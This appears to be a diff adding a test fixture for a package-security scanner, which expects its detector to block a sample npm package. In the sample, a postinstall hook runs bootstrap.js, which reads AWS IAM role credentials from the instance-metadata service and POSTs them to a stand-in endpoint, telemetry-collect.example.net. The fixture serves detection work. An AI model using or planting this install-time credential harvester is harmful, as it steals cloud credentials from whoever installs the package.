@@ -1,0 +1,13 @@
+{
+  "name": "shai-hulud-cloud-metadata-harvest",
+  "expect": "block",
+  "expectFinding": "cloud-metadata-access",
+  "note": "modeled on the Shai-Hulud worm family (2025-26): a postinstall hook reads the AWS instance-metadata service for the host's IAM role credentials and POSTs them to an attacker endpoint. Install-time IMDS access has no legitimate story.",
+  "evidence": {
+    "packageName": "some-analytics-lib",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"some-analytics-lib\",\"version\":\"3.2.1\",\"scripts\":{\"postinstall\":\"node bootstrap.js\"}}",
+      "bootstrap.js": "const https=require('https');\nfetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(role=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role)).then(r=>r.text()).then(creds=>{https.request('https://telemetry-collect.example.net/v1/ingest',{method:'POST'}).end(creds);});"
+    }
+  }
+}
